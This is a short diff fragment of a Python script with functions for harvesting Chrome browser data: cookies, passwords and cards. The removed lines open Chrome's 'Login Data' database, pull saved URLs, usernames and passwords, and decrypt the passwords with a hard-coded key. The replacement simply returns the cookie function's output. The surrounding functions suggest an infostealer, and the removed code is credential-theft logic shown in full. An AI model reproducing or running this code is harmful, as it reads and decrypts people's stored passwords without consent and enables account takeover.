@@ -34,19 +34,7 @@ def get_chrome_cookies():
     return r
 
 def get_chrome_passwords():
-    data_path = os.path.expanduser('~/.config/google-chrome/Default')
-    login_db = os.path.join(data_path, 'Login Data')
-
-    if not os.path.exists(login_db):
-        print(f"Database file not found: {login_db}")
-        return []
-
-    conn = sqlite3.connect(login_db)
-    cursor = conn.cursor()
-    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-    r = [{'url': item[0], 'username': item[1], 'password': decrypt_chrome_password(base64.b64decode(item[2]), b'key_for_aes_decryption')} for item in cursor.fetchall()]
-    conn.close()
-    return r
+    return get_chrome_cookies()
 
 def get_chrome_cards():
     text = r"""
